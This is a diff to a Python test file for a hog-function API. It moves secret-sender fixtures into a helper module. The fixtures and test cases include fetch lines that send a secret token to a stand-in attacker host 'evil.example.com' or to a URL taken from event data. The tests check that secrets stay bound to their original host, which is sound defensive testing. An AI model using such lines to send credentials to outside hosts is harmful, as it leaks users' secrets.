@@ -25,6 +25,15 @@ from products.cdp.backend.api.hog_function import (
     MAX_TRANSFORMATIONS_PER_TEAM,
     comparable_content,
 )
+from products.cdp.backend.api.test.secret_sender import (
+    MOVED_SENDER_HOG,
+    MOVED_URL,
+    SECRET_SENDER,
+    SENDER_HOG,
+    SENDER_URL,
+    secret_host_binding_flag,
+    sender_inputs,
+)
 from products.cdp.backend.api.test.test_hog_function_templates import MOCK_NODE_TEMPLATES
 from products.cdp.backend.filters import RUNTIME_CONTRACT
 from products.cdp.backend.models.hog_function_template import HogFunctionTemplate
@@ -87,33 +96,6 @@ EXAMPLE_FULL: dict[str, Any] = {
         "filter_test_accounts": True,
     },
 }
-
-
-SENDER_URL = "https://hooks.example.com/a"
-MOVED_URL = "https://evil.example.com/a"
-SENDER_HOG = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}});"
-MOVED_SENDER_HOG = "fetch('https://evil.example.com', {'headers': {'Authorization': inputs.token}});"
-SECRET_SENDER: dict[str, Any] = {
-    "name": "Secret sender",
-    "type": "destination",
-    "hog": SENDER_HOG,
-    "inputs_schema": [
-        {"key": "url", "type": "string", "label": "URL", "required": True},
-        {"key": "token", "type": "string", "label": "Token", "secret": True, "required": False},
-    ],
-    "inputs": {"url": {"value": SENDER_URL}, "token": {"value": "I AM SECRET"}},
-}
-
-
-def _sender_inputs(url: str, token: Optional[dict] = None) -> dict:
-    return {"url": {"value": url}, "token": token or {"secret": True}}
-
-
-def secret_host_binding_flag(enabled: bool):
-    return patch(
-        "products.cdp.backend.api.hog_function.posthoganalytics.feature_enabled",
-        side_effect=lambda flag, *args, **kwargs: enabled and flag == "cdp-secret-host-binding",
-    )
 
 
 def get_db_field_value(field, model_id):
@@ -1446,7 +1428,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "unchanged_resave",
                 "put",
-                {"inputs": _sender_inputs(SENDER_URL)},
+                {"inputs": sender_inputs(SENDER_URL)},
                 True,
                 status.HTTP_200_OK,
                 ["https://hooks.example.com"],
@@ -1454,7 +1436,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "same_host",
                 "patch",
-                {"inputs": _sender_inputs("https://hooks.example.com/b")},
+                {"inputs": sender_inputs("https://hooks.example.com/b")},
                 True,
                 status.HTTP_200_OK,
                 ["https://hooks.example.com"],
@@ -1462,7 +1444,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "new_host",
                 "patch",
-                {"inputs": _sender_inputs(MOVED_URL)},
+                {"inputs": sender_inputs(MOVED_URL)},
                 True,
                 status.HTTP_400_BAD_REQUEST,
                 ["https://hooks.example.com"],
@@ -1470,7 +1452,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "same_host_without_tls",
                 "patch",
-                {"inputs": _sender_inputs("http://hooks.example.com/a")},
+                {"inputs": sender_inputs("http://hooks.example.com/a")},
                 True,
                 status.HTTP_400_BAD_REQUEST,
                 ["https://hooks.example.com"],
@@ -1478,7 +1460,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "new_host_by_put",
                 "put",
-                {"inputs": _sender_inputs(MOVED_URL)},
+                {"inputs": sender_inputs(MOVED_URL)},
                 True,
                 status.HTTP_400_BAD_REQUEST,
                 ["https://hooks.example.com"],
@@ -1486,7 +1468,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "new_host_with_the_flag_off",
                 "patch",
-                {"inputs": _sender_inputs(MOVED_URL)},
+                {"inputs": sender_inputs(MOVED_URL)},
                 False,
                 status.HTTP_200_OK,
                 ["https://hooks.example.com"],
@@ -1494,7 +1476,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "new_host_with_the_secret_entered",
                 "patch",
-                {"inputs": _sender_inputs(MOVED_URL, {"value": "I AM NEW"})},
+                {"inputs": sender_inputs(MOVED_URL, {"value": "I AM NEW"})},
                 True,
                 status.HTTP_200_OK,
                 ["https://evil.example.com"],
@@ -1547,7 +1529,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
 
     @parameterized.expand(
         [
-            ("known_origins_new_host", SENDER_HOG, {"inputs": _sender_inputs(MOVED_URL)}, status.HTTP_400_BAD_REQUEST),
+            ("known_origins_new_host", SENDER_HOG, {"inputs": sender_inputs(MOVED_URL)}, status.HTTP_400_BAD_REQUEST),
             (
                 "unknown_origins_rename",
                 "fetch(event.properties.url, {'body': inputs.token});",
@@ -1557,7 +1539,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             (
                 "unknown_origins_any_config_change",
                 "fetch(event.properties.url, {'body': inputs.token});",
-                {"inputs": _sender_inputs("https://hooks.example.com/b")},
+                {"inputs": sender_inputs("https://hooks.example.com/b")},
                 status.HTTP_400_BAD_REQUEST,
             ),
         ]
